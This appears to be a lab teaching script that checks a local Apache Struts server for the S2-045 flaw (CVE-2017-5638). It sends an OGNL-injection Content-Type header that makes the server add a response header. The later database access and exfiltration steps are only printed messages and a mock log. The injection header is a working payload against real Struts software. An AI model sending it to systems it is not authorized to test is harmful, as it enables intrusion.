#!/usr/bin/env python3

import json
import datetime
import time
import urllib.request


WEB_URL = "http://127.0.0.1:8080"


def simulate_struts_attack():
    """Safely simulate an attack against the lab-only Struts application."""

    print("==============================================")
    print("GRC102 AUTHORIZED ATTACK SIMULATION")
    print("==============================================")

    print("Checking vulnerable Struts application...")

    headers = {
        "Content-Type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vulnerable','true')}.multipart/form-data"
    }

    try:
        request = urllib.request.Request(
            WEB_URL,
            headers=headers
        )

        with urllib.request.urlopen(request, timeout=5) as response:

            if response.headers.get("X-Vulnerable") == "true":

                print("System is vulnerable to Struts S2-045.")
                print("CVE: CVE-2017-5638")

                print("Simulating database access...")
                time.sleep(1)

                print("Simulating customer data access...")
                time.sleep(1)

                print("Simulating data exfiltration...")
                time.sleep(1)

                attack_log = {
                    "timestamp": datetime.datetime.now().astimezone().isoformat(),
                    "attack_type": "Struts S2-045 Exploitation Simulation",
                    "target": "web_server",
                    "success": True,
                    "execution_mode": "SAFE_SIMULATION",
                    "actual_exploit_executed": False,
                    "data_accessed": "customer_data database",
                    "records_affected": 3
                }

                with open("attack_log.json", "w") as file:
                    json.dump(
                        attack_log,
                        file,
                        indent=2
                    )

                print()
                print("Attack simulation completed.")
                print("No command execution or real data exfiltration was performed.")
                print("Log saved to attack_log.json")

                return True

            print("Struts vulnerability was not detected.")
            return False

    except Exception as error:

        print(f"Simulation error: {error}")
        return False


if __name__ == "__main__":
    simulate_struts_attack()
